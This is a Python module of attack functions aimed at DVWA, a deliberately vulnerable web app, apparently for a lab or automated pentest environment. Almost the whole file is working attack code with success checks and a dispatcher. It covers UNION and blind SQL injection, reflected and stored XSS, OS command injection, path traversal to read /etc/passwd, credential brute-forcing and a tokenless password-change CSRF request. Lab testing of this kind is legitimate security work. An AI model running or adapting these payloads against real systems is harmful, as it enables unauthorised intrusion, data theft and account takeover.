"""
environment/attack_modules.py

Real attack implementations against DVWA endpoints.
Each function returns an AttackResult dataclass.

LEGAL NOTICE: For use only against DVWA running on your own machine/lab.
"""

import re
import time
import sys
import os
from dataclasses import dataclass, field
from typing import Optional, List
from bs4 import BeautifulSoup

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from config.settings import (
    DVWA_SQLI_URL, DVWA_XSS_URL, DVWA_XSS_STORED_URL,
    DVWA_CMD_URL, DVWA_FI_URL, DVWA_BRUTE_URL, DVWA_CSRF_URL,
    DVWA_URL,
)
from utils.logger import get_logger

log = get_logger("Attacks")


@dataclass
class AttackResult:
    action:      str
    success:     bool
    payload:     str
    response_code: int
    evidence:    str         # extracted data / proof of exploit
    raw_snippet: str         # trimmed HTML fragment for forensics
    duration_ms: float
    error:       Optional[str] = None


def _timer():
    return time.perf_counter()

def _elapsed(t0) -> float:
    return round((time.perf_counter() - t0) * 1000, 2)

def _snippet(html: str, maxlen: int = 300) -> str:
    soup = BeautifulSoup(html, "lxml")
    text = soup.get_text(separator=" ", strip=True)
    return text[:maxlen]


# ─────────────────────────────────────────────────────────────────────────────
# 1. SQL INJECTION — UNION-based
# ─────────────────────────────────────────────────────────────────────────────
def attack_sqli_union(session) -> AttackResult:
    """
    DVWA SQLi — extracts DB user via UNION SELECT.
    Payload: 1' UNION SELECT user(),database()-- -
    """
    payload = "1' UNION SELECT user(),database()-- -"
    t0 = _timer()
    try:
        r = session.get(DVWA_SQLI_URL, params={"id": payload, "Submit": "Submit"})
        html = r.text
        # Success: look for database user in response
        match = re.search(r"First name:(.*?)Surname:(.*?)</", html, re.DOTALL)
        success  = bool(match) or "root@" in html or "dvwa@" in html or "user()" in html.lower()
        evidence = match.group(0)[:120] if match else ("root@localhost" if "root@" in html else "")
        return AttackResult(
            action="sqli_union", success=success, payload=payload,
            response_code=r.status_code, evidence=evidence,
            raw_snippet=_snippet(html), duration_ms=_elapsed(t0)
        )
    except Exception as e:
        return AttackResult("sqli_union", False, payload, 0, "", "", _elapsed(t0), str(e))


# ─────────────────────────────────────────────────────────────────────────────
# 2. SQL INJECTION — Boolean Blind
# ─────────────────────────────────────────────────────────────────────────────
def attack_sqli_boolean_blind(session) -> AttackResult:
    """
    DVWA SQLi Blind — compares true/false responses.
    True:  1' AND 1=1-- -
    False: 1' AND 1=2-- -
    """
    payload_true  = "1' AND 1=1-- -"
    payload_false = "1' AND 1=2-- -"
    t0 = _timer()
    try:
        r_true  = session.get(DVWA_SQLI_URL, params={"id": payload_true,  "Submit": "Submit"})
        r_false = session.get(DVWA_SQLI_URL, params={"id": payload_false, "Submit": "Submit"})

        len_true  = len(r_true.text)
        len_false = len(r_false.text)
        success   = abs(len_true - len_false) > 20   # significant length difference → injectable

        evidence = (f"True-response length={len_true}, False-response length={len_false}"
                    if success else "No length difference detected")
        return AttackResult(
            action="sqli_boolean_blind", success=success,
            payload=f"TRUE={payload_true} / FALSE={payload_false}",
            response_code=r_true.status_code, evidence=evidence,
            raw_snippet=_snippet(r_true.text), duration_ms=_elapsed(t0)
        )
    except Exception as e:
        return AttackResult("sqli_boolean_blind", False, "", 0, "", "", _elapsed(t0), str(e))


# ─────────────────────────────────────────────────────────────────────────────
# 3. XSS — Reflected
# ─────────────────────────────────────────────────────────────────────────────
def attack_xss_reflected(session) -> AttackResult:
    """
    DVWA XSS Reflected — injects <script> tag via name parameter.
    """
    payload = "<script>alert('XSS_PWNED')</script>"
    t0 = _timer()
    try:
        r       = session.get(DVWA_XSS_URL, params={"name": payload, "Submit": "Submit"})
        html    = r.text
        success = payload in html or "XSS_PWNED" in html or "<script>alert" in html
        evidence= f"Payload reflected in response" if success else "Payload escaped/blocked"
        return AttackResult(
            action="xss_reflected", success=success, payload=payload,
            response_code=r.status_code, evidence=evidence,
            raw_snippet=_snippet(html), duration_ms=_elapsed(t0)
        )
    except Exception as e:
        return AttackResult("xss_reflected", False, payload, 0, "", "", _elapsed(t0), str(e))


# ─────────────────────────────────────────────────────────────────────────────
# 4. XSS — Stored
# ─────────────────────────────────────────────────────────────────────────────
def attack_xss_stored(session) -> AttackResult:
    """
    DVWA XSS Stored — posts malicious message to guestbook.
    Then retrieves page to confirm persistence.
    """
    payload = "<script>alert('STORED_XSS')</script>"
    t0 = _timer()
    try:
        token = session.get_csrf_token(DVWA_XSS_STORED_URL)
        post_data = {
            "txtName":    "attacker",
            "mtxMessage": payload,
            "btnSign":    "Sign Guestbook",
            "user_token": token,
        }
        session.post(DVWA_XSS_STORED_URL, data=post_data)

        # Verify persistence
        r       = session.get(DVWA_XSS_STORED_URL)
        success = payload in r.text or "STORED_XSS" in r.text
        evidence= "Payload persisted in guestbook" if success else "Payload not found in stored page"
        return AttackResult(
            action="xss_stored", success=success, payload=payload,
            response_code=r.status_code, evidence=evidence,
            raw_snippet=_snippet(r.text), duration_ms=_elapsed(t0)
        )
    except Exception as e:
        return AttackResult("xss_stored", False, payload, 0, "", "", _elapsed(t0), str(e))


# ─────────────────────────────────────────────────────────────────────────────
# 5. COMMAND INJECTION
# ─────────────────────────────────────────────────────────────────────────────
def attack_cmd_injection(session) -> AttackResult:
    """
    DVWA Command Execution — appends OS command after ping target.
    Payload: 127.0.0.1; id
    """
    payload = "127.0.0.1; id"
    t0 = _timer()
    try:
        token = session.get_csrf_token(DVWA_CMD_URL)
        r = session.post(DVWA_CMD_URL, data={
            "ip":         payload,
            "Submit":     "Submit",
            "user_token": token,
        })
        html    = r.text
        # Look for uid= output indicating command execution
        match   = re.search(r"uid=\d+\(\w+\)", html)
        success = bool(match)
        evidence= match.group(0) if match else "No uid= output found"
        return AttackResult(
            action="cmd_injection", success=success, payload=payload,
            response_code=r.status_code, evidence=evidence,
            raw_snippet=_snippet(html), duration_ms=_elapsed(t0)
        )
    except Exception as e:
        return AttackResult("cmd_injection", False, payload, 0, "", "", _elapsed(t0), str(e))


# ─────────────────────────────────────────────────────────────────────────────
# 6. FILE INCLUSION (LFI)
# ─────────────────────────────────────────────────────────────────────────────
def attack_file_inclusion(session) -> AttackResult:
    """
    DVWA File Inclusion — attempts LFI to read /etc/passwd.
    """
    payload = "../../../../../../../../etc/passwd"
    t0 = _timer()
    try:
        r    = session.get(DVWA_FI_URL, params={"page": payload})
        html = r.text
        # Success: /etc/passwd contents visible
        success  = "root:x:0:0" in html or "nobody:x:" in html or "/bin/bash" in html
        evidence = "Read /etc/passwd — root user entry found" if success else "File not read"
        return AttackResult(
            action="file_inclusion", success=success, payload=payload,
            response_code=r.status_code, evidence=evidence,
            raw_snippet=_snippet(html), duration_ms=_elapsed(t0)
        )
    except Exception as e:
        return AttackResult("file_inclusion", False, payload, 0, "", "", _elapsed(t0), str(e))


# ─────────────────────────────────────────────────────────────────────────────
# 7. BRUTE FORCE
# ─────────────────────────────────────────────────────────────────────────────
BRUTE_CREDENTIALS = [
    ("admin",  "admin"),
    ("admin",  "password"),
    ("admin",  "admin123"),
    ("admin",  "123456"),
    ("user",   "user"),
    ("gordonb","abc123"),
    ("1337",   "charley"),
]

def attack_brute_force(session) -> AttackResult:
    """
    DVWA Brute Force — tries credential list against login form.
    """
    t0 = _timer()
    try:
        for username, password in BRUTE_CREDENTIALS:
            token = session.get_csrf_token(DVWA_BRUTE_URL)
            r = session.get(DVWA_BRUTE_URL, params={
                "username":   username,
                "password":   password,
                "Login":      "Login",
                "user_token": token,
            })
            html = r.text
            if "Welcome to the password protected area" in html or \
               "Welcome," in html or "logout" in html.lower():
                evidence = f"Valid credentials found: {username}:{password}"
                return AttackResult(
                    action="brute_force", success=True,
                    payload=f"{username}:{password}",
                    response_code=r.status_code, evidence=evidence,
                    raw_snippet=_snippet(html), duration_ms=_elapsed(t0)
                )
        return AttackResult(
            action="brute_force", success=False,
            payload=f"Tried {len(BRUTE_CREDENTIALS)} credential pairs",
            response_code=200, evidence="No valid credentials found",
            raw_snippet="", duration_ms=_elapsed(t0)
        )
    except Exception as e:
        return AttackResult("brute_force", False, "", 0, "", "", _elapsed(t0), str(e))


# ─────────────────────────────────────────────────────────────────────────────
# 8. CSRF PROBE
# ─────────────────────────────────────────────────────────────────────────────
def attack_csrf_probe(session) -> AttackResult:
    """
    DVWA CSRF — checks if CSRF token is enforced on password change.
    Sends a password change request without a valid token.
    """
    payload = "new_password_without_token"
    t0 = _timer()
    try:
        r = session.get(DVWA_CSRF_URL, params={
            "password_new":  payload,
            "password_conf": payload,
            "Change":        "Change",
            # Deliberately omitting user_token
        })
        html    = r.text
        success = "Password Changed" in html or "password has been changed" in html.lower()
        evidence= "Password changed without CSRF token!" if success else "CSRF protection enforced"
        return AttackResult(
            action="csrf_probe", success=success, payload=payload,
            response_code=r.status_code, evidence=evidence,
            raw_snippet=_snippet(html), duration_ms=_elapsed(t0)
        )
    except Exception as e:
        return AttackResult("csrf_probe", False, payload, 0, "", "", _elapsed(t0), str(e))


# ─────────────────────────────────────────────────────────────────────────────
# Dispatcher — maps action name → function
# ─────────────────────────────────────────────────────────────────────────────
ATTACK_DISPATCH = {
    "sqli_union":         attack_sqli_union,
    "sqli_boolean_blind": attack_sqli_boolean_blind,
    "xss_reflected":      attack_xss_reflected,
    "xss_stored":         attack_xss_stored,
    "cmd_injection":      attack_cmd_injection,
    "file_inclusion":     attack_file_inclusion,
    "brute_force":        attack_brute_force,
    "csrf_probe":         attack_csrf_probe,
}

def execute_attack(action_name: str, session) -> AttackResult:
    fn = ATTACK_DISPATCH.get(action_name)
    if fn is None:
        return AttackResult(action_name, False, "", 0, "Unknown action", "", 0.0)
    return fn(session)
